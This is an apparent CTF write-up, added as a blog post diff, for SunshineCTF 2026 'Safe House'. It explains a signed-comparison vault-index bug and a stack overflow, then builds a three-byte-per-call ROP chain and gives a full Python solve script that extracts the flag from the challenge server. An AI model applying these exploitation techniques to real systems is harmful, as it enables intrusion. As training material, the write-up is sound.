@@ -1,0 +1,235 @@
+---
+title: 'SunshineCTF 2026 - Safe House'
+description: 'A ROP chain limited to three bytes per call, used to speak to a seccomped child process over its socketpair and hand it a negative vault index'
+date: 2026-09-30
+tags: ['writeup', 'pwn', 'buffer-overflow', 'rop', 'sandbox-escape', 'seccomp', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+Two processes: a front desk and a vault. The vault child has a signed-comparison bug that lets a negative index walk backwards out of the public array into the system array where the flag handle lives — but the parent refuses to forward the argument that would trigger it.
+
+So the parent gets overflowed, and its ROP chain is used to write to the socketpair by hand. The catch is that `rdx` cannot be set anywhere in the binary, which pins every call in the chain to **three bytes at a time**.
+
+## Challenge Description
+
+> The safe house processes reports and files notes for the field. Get past the front desk and into the vault.
+
+Provided: `service`. No canary, no PIE, Full RELRO.
+
+## Initial Analysis
+
+The front desk is a plain text protocol:
+
+```text
+SafeHouse v1.0
+Type HELP.
+sh> HELP
+cmds: PING HELP NOTE RELAY SUBMIT QUIT
+sh> RELAY 4
+vault: 4 system, 0/16 public
+```
+
+`main` builds a `socketpair(AF_UNIX, SOCK_STREAM)` and forks. The child sets up the vault:
+
+```asm
+40178e:  lea    rbp,[rip+0x18da]        ; "/dev/null"
+40179f:  call   401260 <open@plt>       ; -> dup2'd over stdin/stdout
+4017da:  lea    rdi,[rip+0x1898]        ; "flag.txt"
+4017e3:  call   401260 <open@plt>
+4017e8:  mov    DWORD PTR [rip+0x388e],0x2     ; 0x405080  type
+4017f2:  mov    DWORD PTR [rip+0x388c],eax     ; 0x405084  fd
+```
+
+So the flag handle goes into a **system array at `0x405080`**, and a loop then fills a **public array at `0x4060b0`** with sixteen `/dev/null` handles. Both use a stride of `0x40c`. Both processes install a seccomp filter.
+
+Messages between them are `op(1) | len(2, big endian) | pad(1) | data`, with the whole buffer XORed by a repeating four-byte key held at `0x405060`:
+
+```asm
+401be0:  mov    eax,edx
+401be2:  bswap  edx
+401be4:  mov    DWORD PTR [rsp-0x4],edx
+401be8:  shr    eax,0x18
+401bf0:  xor    BYTE PTR [rdi],al
+401c00:  mov    rdx,rax
+401c03:  and    edx,0x3
+401c06:  movzx  edx,BYTE PTR [rsp+rdx*1-0x4]
+401c0b:  xor    BYTE PTR [rdi+rax*1],dl
+```
+
+## The child's bug
+
+Op 3 takes its vault index straight out of the request body:
+
+```asm
+4019c0:  cmp    WORD PTR [rsp+0x16],0x3
+4019c6:  jbe    401a89                       ; needs len > 3
+4019cc:  movsxd rax,DWORD PTR [rsp+0x420]    ; attacker-controlled, sign-extended
+4019d4:  cmp    eax,0xf
+4019d7:  jg     401a6e                       ; SIGNED compare
+4019dd:  imul   rax,rax,0x40c
+4019e4:  add    rax,rbx                      ; rbx = 0x4060b0, the public array
+```
+
+The bound is a **signed** `jg`, so it only rejects indices above 15. Anything negative sails through, and the arithmetic is plain multiplication:
+
+```text
+0x4060b0 - 4 * 0x40c == 0x405080
+```
+
+Index `-4` is the flag entry.
+
+The parent will not send it for you. Its RELAY handler builds a four-byte header with the length **hardcoded to zero** and never forwards the argument at all:
+
+```asm
+401fbe:  mov    WORD PTR [rsp+0xd],ax   ; ax = 0, so len = 0
+401fc3:  call   401be0                  ; obfuscate the 4-byte header
+401fc8:  mov    rsi,rcx
+401fcb:  mov    edx,0x4
+401fd0:  mov    edi,0x3
+401fd5:  call   401190 <write@plt>      ; only 4 bytes ever go out
+```
+
+Op 3 needs `len > 3`, so through the front door it can never fire. Which is why `RELAY 3 <anything>` comes back empty while `RELAY 4` works.
+
+## The parent's bug
+
+`SUBMIT <size>` reads into a `0x40` stack buffer using only the **low byte** of the parsed size:
+
+```asm
+401ee5:  call   401220 <strtol@plt>
+401eea:  mov    rbx,rax
+401eed:  test   al,al
+401eef:  je     401f38                  ; only rejects sizes whose low byte is 0
+401f07:  xor    edi,edi
+401f09:  movzx  edx,bl                  ; length = low byte, up to 255
+401f0c:  mov    rsi,rsp
+401f0f:  call   4011f0 <read@plt>
+```
+
+No canary, no PIE. The frame is `push rbx` plus `sub rsp,0x40`, so the return address sits at offset 72 and `SUBMIT 255` leaves 183 bytes of chain.
+
+The gadget situation is thin:
+
+```text
+  pop rdi; ret     0x401529
+  pop rsi; ret     0x401dd5
+  pop rbx; ret     0x401f33
+  pop rdx; ret     -
+  pop rax; ret     -
+  syscall          -
+```
+
+**No `rdx` control anywhere in the image.** But `rdx` is left at `3` by the `write(1,"OK\n",3)` that runs just before the return, and the `syscall` instruction preserves `rdx`, so every call in the chain is stuck at three bytes. That is survivable, just tedious.
+
+The other trick is unlimited chain length. Setting `rbx` and returning into the middle of the SUBMIT handler re-runs the read onto the current stack:
+
+```asm
+401f07:  xor    edi,edi
+401f09:  movzx  edx,bl          ; bl = 0xff, chosen via pop rbx
+401f0c:  mov    rsi,rsp
+401f0f:  call   read            ; 255 more bytes, onto the chain itself
+401f2f:  add    rsp,0x40
+401f33:  pop    rbx
+401f34:  ret                    ; continues at rsp+0x48
+```
+
+So `pop rbx = 0xff` then `0x401f07` is a chain extender: each stage reads another 255 bytes and resumes at offset `0x48` into them.
+
+## Exploitation
+
+`execve` is not on the table. The **parent is seccomped too** — a `system("/bin/sh")` chain dies with **SIGSYS**, exit code `-31`, and so does a plain `open("flag.txt")`:
+
+```text
+  libc base  = 0x7cc937a00000
+  drain:     b'OK\n'
+  exit status: -31
+```
+
+That is the whole design: only the child may touch the vault. So the chain has to talk to the child instead.
+
+1. `write(1, 0x405060, 3)` twice, leaking the four-byte XOR key.
+2. `read(0, BSS, 3)` three times to pull in the crafted request, obfuscated with that key: `xor4(b"\x03\x00\x04\x00" + p32(-4), key)`.
+3. `write(3, BSS, 3)` three times, handing it to the child on fd 3.
+4. `read(3, buf, 3)` and `write(1, buf, 3)` in pairs, pumping the reply back out three bytes at a time.
+
+De-obfuscating the reply with the same key gives a status header of `00 00 28 00` followed by the flag:
+
+```text
+deobf: b'\x00\x00(\x00sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}\n'
+```
+
+## Solve Script
+
+```python
+import struct, time
+p64 = lambda x: struct.pack("<Q", x)
+
+POP_RDI, POP_RSI, POP_RBX = 0x401529, 0x401dd5, 0x401f33
+WRITE_PLT, READ_PLT = 0x401190, 0x4011f0
+EXTEND    = 0x401f07     # xor edi,edi; movzx edx,bl; mov rsi,rsp; call read
+KEY_ADDR  = 0x405060
+BSS, RBUF = 0x405800, 0x405900
+PAD1, PAD2, CAP = 72, 0x48, 255
+
+def call(fn, rdi, rsi=None):
+    c = p64(POP_RDI) + p64(rdi)
+    if rsi is not None:
+        c += p64(POP_RSI) + p64(rsi)
+    return c + p64(fn)
+
+def extend():
+    return p64(POP_RBX) + p64(0xff) + p64(EXTEND)
+
+def stage(calls, pad):
+    body = b"".join(calls) + extend()
+    pay = b"X" * pad + body
+    assert len(pay) <= CAP
+    return pay.ljust(CAP, b"Y")
+
+def xor4(data, key):
+    ks = [(key >> (8 * (3 - i))) & 0xff for i in range(4)]
+    return bytes(b ^ ks[i & 3] for i, b in enumerate(data))
+
+def run(target, nresp=24):
+    t = T(target); t.drain(0.6)
+    t.send("SUBMIT 255\n"); t.drain(0.4)
+
+    # stage 1: leak the 4-byte obfuscation key (rdx is pinned at 3)
+    t.send(stage([call(WRITE_PLT, 1, KEY_ADDR), call(WRITE_PLT, 1, KEY_ADDR + 3)], PAD1))
+    out = t.drain(1.0)
+    key = struct.unpack("<I", out[out.find(b"OK\n") + 3:][:4])[0]
+
+    # stage 2: pull the crafted op-3 request in from stdin.  index -4 walks
+    # back from the public array (0x4060b0) onto the flag entry (0x405080)
+    req = bytes([3, 0x00, 0x04, 0x00]) + struct.pack("<i", -4)
+    obf = xor4(req, key) + b"\x00"
+    t.send(stage([call(READ_PLT, 0, BSS), call(READ_PLT, 0, BSS + 3),
+                  call(READ_PLT, 0, BSS + 6)], PAD2))
+    time.sleep(0.3); t.send(obf); time.sleep(0.4); t.drain(0.4)
+
+    # stage 3: push it at the child over the socketpair
+    t.send(stage([call(WRITE_PLT, 3, BSS), call(WRITE_PLT, 3, BSS + 3),
+                  call(WRITE_PLT, 3, BSS + 6)], PAD2))
+    time.sleep(0.5); t.drain(0.5)
+
+    # stages 4..n: pump the reply back, three bytes at a time
+    got = b""
+    for k in range(nresp):
+        off = k * 3
+        t.send(stage([call(READ_PLT, 3, RBUF + off), call(WRITE_PLT, 1, RBUF + off)], PAD2))
+        time.sleep(0.25)
+        chunk = t.drain(0.4)
+        j = chunk.find(b"OK\n")
+        got += chunk[j + 3:] if j >= 0 else chunk
+    return key, got
+
+key, got = run(("chal.sunshinectf.games", 26007))
+print(xor4(got, key))
+```
+
+## Flag
+
+```text
+sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}
+```
